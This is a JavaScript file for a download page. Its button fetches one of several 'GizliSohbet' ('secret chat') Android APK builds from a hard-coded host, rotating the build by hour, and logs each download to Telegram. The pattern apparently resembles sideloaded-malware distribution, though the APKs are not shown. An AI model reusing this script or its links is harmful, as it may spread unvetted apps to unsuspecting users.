import { sendLog } from './log.js';

document.addEventListener("DOMContentLoaded", () => {
  const btn = document.getElementById('download-button');

  const apkLinks = [
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV4.apk",
"https://kaspergroo.com/GizliSohbetV4.apk",
"https://kaspergroo.com/GizliSohbetV4.apk",
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV1.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV2.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV3.apk",
"https://kaspergroo.com/GizliSohbetV4.apk",
"https://kaspergroo.com/GizliSohbetV4.apk",
"https://kaspergroo.com/GizliSohbetV4.apk"
  ];

  btn.addEventListener('click', () => {
    btn.innerText = 'İndiriliyor...';
    btn.disabled = true;

    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];

    // Telegram log (harici dosyada)
    sendLog(fileUrl);

    // Dosya indirme
    const a = document.createElement('a');
    a.href = fileUrl;
    a.download = '';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    setTimeout(() => {
      btn.innerText = 'Tekrar İndir';
      btn.disabled = false;
    }, 3000);
  });
});






